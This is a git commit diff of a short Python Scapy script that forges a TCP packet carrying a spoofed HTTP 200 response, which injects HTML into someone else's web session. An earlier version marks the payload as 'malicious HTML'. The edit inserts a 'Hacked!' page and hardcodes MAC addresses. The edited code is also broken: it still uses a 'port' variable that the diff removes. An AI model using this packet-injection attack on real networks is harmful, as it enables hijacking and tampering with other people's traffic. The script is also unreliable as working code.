6e2af3df16c2b294ceccda0719a6950762463bfc
Brandt Woolf <bwoolf16@gmail.com>
2016-05-02 22:35:24 -0400

    edited script

--- scapy/packet.py
+++ scapy/packet.py
@@ -1,17 +1,19 @@
 from scapy.all import *
 import sys
 
-mac_src = sys.argv[1]
-mac_dst = sys.argv[2]
-ip_src = sys.argv[3]
-ip_dst = sys.argv[4]
-port = int(sys.argv[5])
-seq_num = int(sys.argv[6])
+#mac_src = sys.argv[1]
+#mac_dst = sys.argv[2]
+ip_src = sys.argv[1]
+ip_dst = sys.argv[2]
+source_port = int(sys.argv[3])
+dst_port = int(sys.argv[4])
+seq_num = int(sys.argv[5])
+ack_seq_num = int(sys.argv[6])
 
-eth = Ether(dst=mac_dst, src=mac_src)
+eth = Ether(dst="00:0C:29:9E:EB:5A", src="00:0C:29:33:AA:35")
 ip = IP(src=ip_src, dst=ip_dst, flags="DF")
-tcp = TCP(flags="PA", sport=80, dport=port, seq=seq_num, ack=1)
-data = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nTHIS IS WHERE MALICIOUS HTML GOES"
+tcp = TCP(flags="PA", sport=80, dport=port, seq=seq_num, ack=ack_seq_num)
+data = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>Hacked!</html>"
 frame = eth/ip/tcp/data
 
 sendp(frame)
